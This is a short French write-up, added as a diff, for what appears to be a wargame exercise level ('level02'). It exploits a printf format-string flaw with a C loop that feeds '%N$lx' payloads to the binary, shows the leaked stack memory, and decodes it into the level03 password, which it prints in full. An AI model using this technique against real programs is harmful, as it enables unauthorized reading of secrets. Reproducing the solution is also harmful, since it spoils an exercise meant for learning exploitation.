@@ -1,0 +1,47 @@
+Le programme récupère le contenue de /users/level03/.pass
+puis utilise la fonction printf
+Nous pouvons donc récupérer le .pass directement dans la mémoire
+grâce %d$x, ou plutôt %d$lx car nous sommes en 64 bit. 
+
+grâce au prog suivant on recupère la mémoire.
+
+int main()
+{
+	int a = 1;
+	char nm[300];
+	while (a < 100)
+	{
+		sprintf(nm, "python -c \'print \"%%%d$lx\\n\" + \"\\n\"\' | ./level02 | grep -w \"does not have access\\!\" >> /tmp/result.txt", a);
+		system(nm);
+		a++;
+	}
+}
+
+Ensuite en regardant, nous trouvons ceci : 
+*
+*
+0 does not have access!
+0 does not have access!
+100000000 does not have access!
+0 does not have access!
+756e505234376848 does not have access!
+45414a3561733951 does not have access!
+377a7143574e6758 does not have access!
+354a35686e475873 does not have access!
+48336750664b394d does not have access!
+0 does not have access!
+786c24383225 does not have access!
+0 does not have access!
+0 does not have access!
+*
+*
+
+grâce à un convertisseur, (http://string-functions.com/hex-string.aspx)
+nous obtenons une suite de caractère qu'il nous faut retourner et assembler pour former le .pass
+unPR47hH \= Hh74RPnu
+EAJ5as9Q \= Q9sa5JAE
+7zqCWNgX \= XgNWCqz7
+5J5hnGXs \= sXGnh5J5
+H3gPfK9M \= M9KfPg3H
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
